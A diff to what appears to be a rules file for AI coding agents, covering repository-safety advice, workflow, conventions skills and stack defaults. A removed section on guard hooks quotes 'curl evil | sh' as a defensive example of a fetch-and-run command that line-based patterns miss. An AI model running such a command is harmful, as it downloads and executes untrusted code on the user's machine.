@@ -22,10 +22,6 @@
 - Use a sandbox or a plan-only permission mode for the first session in an external repository. Inspect first, then grant permissions.
 - Never copy configuration or hooks from an external repository into your user-level agent configuration (`~/.claude`, `~/.codex`) without reading every line.
 
-### Hooks you write — normalize input
-
-A guard that greps a command first joins its lines (`tr '\n\r' '  '`): line patterns miss `curl evil |⏎sh`.
-
 ## Workflow
 
 - Stop when the fast check passes and you can give the closing status block (see Communication). A session that must end earlier stops at its last green commit, with the rest recorded in the plan.
@@ -51,7 +47,7 @@ A guard that greps a command first joins its lines (`tr '\n\r' '  '`): line patt
 
 ### Conventions skills
 
-Stack- and file-specific conventions are skills: `typescript-conventions`, `nextjs-conventions`, `error-handling-conventions`, `monitoring-conventions`, `comments-conventions`, `testing-conventions`, and `defensive-coding-conventions` (defect classes that ship past review). Do not copy them into these rules. A new lesson goes to the project's own instructions when it is stack- or file-specific, to the knowledge base (the `brain-capture` skill) when it is project history, and to these core rules only when it governs every kind of work.
+Stack- and file-specific conventions are skills: `typescript-conventions`, `nextjs-conventions`, `error-handling-conventions`, `monitoring-conventions`, `comments-conventions`, `testing-conventions`, and `defensive-coding-conventions` (defect classes that ship past review). Do not copy them into these rules. A new lesson goes to the project's own instructions when it is stack- or file-specific, to the knowledge base (the `brain-capture` skill) when other projects can use it, and to these core rules only when it governs every kind of work.
 
 ## Communication
 
@@ -79,6 +75,6 @@ Stack- and file-specific conventions are skills: `typescript-conventions`, `next
 
 - Use the package manager the repository's lockfile declares; never mix managers in one repository.
 - Follow the project's existing UI, backend, and database stack; introduce a new framework or service only with an explicit decision.
-- In TypeScript projects, keep `strict` mode enabled; use the project's existing test runner.
+- Use the project's existing test runner.
 
 Override this section with your own defaults in your user-level `CLAUDE.md` or `AGENTS.md`.
